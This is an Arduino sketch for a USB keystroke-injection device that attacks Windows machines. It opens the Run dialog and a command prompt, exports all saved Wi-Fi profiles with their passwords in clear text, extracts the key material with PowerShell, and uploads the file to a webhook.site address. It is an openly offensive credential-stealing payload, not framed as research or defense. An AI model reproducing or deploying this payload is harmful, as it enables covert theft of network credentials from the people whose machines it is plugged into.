#include<Keyboard.h>
#define KEY_DELAY 50 //delay between keystrokes for slow computers

//a command line to execute
const char command [] = "echo hello hackers";

void setup() {
  Keyboard.begin();
  delay(8000);
}

void loop() {
  //Pressing Win+r shortcut
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(KEY_DELAY);
  Keyboard.releaseAll();
  delay(KEY_DELAY);
  //Inputting cmd command
  Keyboard.println("cmd");
  delay(1000);
  Keyboard.println("cd %temp%");
  delay(1000);
  Keyboard.println("netsh wlan export profile key=clear");
  delay(1000);
    Keyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
  delay(1000);
    Keyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/9c6be401-0394-486e-8a2b-c164ff8b04e8 -Method POST -InFile Wi-Fi-PASS");
  delay(1000);
  //Keyboard.println("del Wi-* /s /f /q");
  delay(1000);
   //Keyboard.println("del Wi-* /s /f /q");
  delay(1000);
   //  Keyboard.println("exit");
  delay(1000);
  
  delay(50000);
}
